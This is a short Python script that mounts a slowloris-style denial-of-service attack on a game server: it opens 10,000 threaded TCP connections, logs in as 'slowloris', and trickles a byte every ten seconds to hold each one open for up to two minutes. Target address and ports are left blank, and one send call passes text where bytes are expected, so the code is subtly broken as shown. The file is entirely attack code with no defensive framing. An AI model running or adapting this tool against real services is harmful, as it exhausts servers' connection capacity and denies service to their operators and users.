import time
import socket
from threading import Thread

IP = 
HIGHSCORES = 
GAME = 

ENCODING = "ascii"
MAX_ATTACK_TIME = 120
DATA_SEND_PERIOD = 10

class Connection(Thread):

    def log(self, msg):
        print(f"{self.index}: {msg}")

    def __init__(self, index):
        super().__init__()
        self.index = index
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((IP, GAME))
        self.alive = True
        self.log("connected")

    def run(self):
        try:
            self.log("started")
            self.send("\"slowloris\"\0")  # send username
            self.receive()
            while self.alive:
                # send data periodically
                self.log("sending")
                self.socket.sendall("1")
                time.sleep(DATA_SEND_PERIOD)
        finally:
            self.close()

    def send(self, msg):
        byte_msg = bytes(msg.encode(ENCODING))
        self.socket.sendall(byte_msg)

    def receive(self):
        message = b""
        recv = self.socket.recv(1)
        while recv != b"\0":
            message += recv
            recv = self.socket.recv(1)
        return message.decode(ENCODING)

    def close(self):
        self.socket.close()

if __name__ == "__main__":
    connections = []
    for i in range(10000):
        connection = Connection(i)
        connection.daemon = True
        connection.start()
        connections.append(connection)

    try:
        time.sleep(MAX_ATTACK_TIME)
        
    finally:
        # kill all connections
        for connection in connections:
            connection.alive = False